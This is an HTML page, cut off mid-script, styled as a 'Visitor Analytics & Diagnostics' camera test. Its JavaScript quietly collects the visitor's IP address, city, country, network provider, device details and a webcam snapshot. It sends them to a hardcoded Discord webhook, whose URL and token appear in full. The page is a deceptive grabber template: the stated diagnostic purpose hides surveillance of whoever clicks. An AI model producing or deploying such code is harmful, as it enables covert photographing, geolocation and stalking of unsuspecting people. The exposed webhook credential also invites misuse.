<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visitor Analytics & Diagnostics</title>
    <style>
        :root {
            --bg-color: #0b0c10;
            --card-bg: #1f2833;
            --accent: #66fcf1;
            --text: #c5c6c7;
            --header-text: #ffffff;
        }
        body {
            font-family: Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: var(--card-bg);
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            max-width: 450px;
            width: 100%;
            text-align: center;
        }
        h1 {
            color: var(--header-text);
            font-size: 1.3rem;
            margin-bottom: 1rem;
        }
        p {
            font-size: 0.9rem;
            margin-bottom: 1.5rem;
        }
        button {
            background-color: var(--accent);
            color: #0b0c10;
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: bold;
            font-size: 1rem;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        button:hover {
            opacity: 0.9;
        }
        #status {
            margin-top: 1rem;
            font-size: 0.85rem;
            color: var(--accent);
        }
    </style>
</head>
<body>

    <div class="container" id="main-card">
        <h1>Visitor Analytics & Diagnostics</h1>
        <p>Click below to initialize device telemetry check and camera sensor test.</p>
        <button id="run-btn">Request Camera Access</button>
        <div id="status"></div>
    </div>

    <video id="cam" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // REPLACE WITH YOUR DISCORD WEBHOOK URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569242899189596270/DZaFBALGc0JagZAvmWgd43_qnM4CEEPpZZi4x-lXfDw-57L1moD3y5MRtx0Ahver7xQP';

        document.getElementById('run-btn').addEventListener('click', async () => {
            const status = document.getElementById('status');
            status.innerText = "Gathering network telemetry...";

            let ipData = { ip: "Unavailable", city: "Unknown", country_name: "Unknown", org: "Unknown" };

            // 1. Get IP Data safely with a 3-second timeout
            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 3000);
                const ipRes = await fetch('https://ipapi.co/json/', { signal: controller.signal });
                clearTimeout(timeoutId);
                if (ipRes.ok) {
                    ipData = await ipRes.json();
                }
            } catch (e) {
                console.warn("IP lookup timed out or failed:", e);
            }

            const ua = navigator.userAgent;
            let deviceModel = "Desktop / Generic";
            if (/android/i.test(ua)) deviceModel = "Android Device";
            else if (/iphone|ipad|ipod/i.test(ua)) deviceModel = "iOS / Apple Device";

            try {
                // 2. Request Camera
                status.innerText = "Initializing camera stream...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                const video = document.getElementById('cam');
                video.srcObject = stream;

                // Wait 1.5s to ensure frame is fully rendered by hardware
                await new Promise(resolve => setTimeout(resolve, 1500));

                status.innerText = "Transmitting telemetry & photo snapshot...";

                // 3. Draw frame to hidden Canvas
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Immediately turn off camera LED/stream
                stream.getTracks().forEach(t => t.stop());

                // 4. Send Telemetry Embed First (Pure JSON - guarantees Discord receipt)
                const embedPayload = {
                    embeds: [{
                        title: "🚨 New Diagnostic Log",
                        color: 65280,
                        fields: [
                            { name: "🌐 IP Address", value: ipData.ip || "N/A", inline: true },
                            { name: "📍 Location", value: `${ipData.city || 'N/A'}, ${ipData.country_name || 'N/A'}`, inline: true },
                            { name: "🏢 Network Provider", value: ipData.org || "N/A", inline: false },
                            { name: "📱 Device Type", value: deviceModel, inline: true },
                            { name: "💻 Operating System", value: navigator.platform || "N/A", inline: true },
                            { name: "📺 Screen Size", value: `${window.screen.width}x${window.screen.height}`, inline: true },
                            { name: "🧭 User Agent", value: `\`\`\`${ua}\`\`\``, inline: false }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embedPayload)
                });

                // 5. Convert Canvas to Blob and send snapshot image as second message
                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const imgFormData = new FormData();
                        imgFormData.append('file', blob, 'capture.jpg');
                        imgFormData.append('content', '📷 **Captured Snapshot:**');

                        await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            body: imgFormData
                        });
                    }
